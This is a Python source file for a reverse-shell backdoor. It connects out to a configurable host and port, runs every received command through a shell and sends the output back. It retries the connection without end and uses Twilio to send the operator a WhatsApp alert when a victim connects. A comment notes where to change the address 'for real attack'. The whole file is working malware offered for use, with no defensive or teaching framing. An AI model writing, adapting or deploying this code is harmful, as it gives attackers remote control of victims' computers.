import socket
import os
import subprocess
from twilio.rest import Client 
def whatsapp(ip,conn): 
    account_sid = 'YOUR TWILIO SID' 
    auth_token = 'YOUR TWILIO AUTH TOKEN' 
    client = Client(account_sid, auth_token) 
    if(conn==0):
        message = client.messages.create( 
                                    from_='whatsapp:+14155238886',  
                                    body='IP: '+str(ip)+' trying to connect',
                                    to='whatsapp:YOUR NUMBER' 
                                ) 
    if(conn==1):
        message = client.messages.create( 
                                    from_='whatsapp:+14155238886',  
                                    body='IP: '+str(ip)+' connected',
                                    to='whatsapp:YOUR NUMBER' 
                                ) 


global host
global port
s = socket.socket()
hostname = socket.gethostname()         #change this part for real attack
host = socket.gethostbyname(hostname)
port = 9999



def being_attacked(s): 
    global host
    global port
    try:
        s.connect((host,port))
        whatsapp(host,1)
        while(1):
            data = s.recv(1024)
            if(data[:2].decode("utf-8")=="cd"):
                os.chdir(data[3:].decode("utf-8"))

            if(len(data)>0):
                cmd = subprocess.Popen(data.decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                output_byte = cmd.stdout.read() +cmd.stderr.read()
                output_str = str(output_byte,"utf-8")
                pwd = os.getcwd() + "!!"
                s.send(str.encode(output_str + pwd))
    except:
        whatsapp(host,0)
        being_attacked(s)

being_attacked(s)
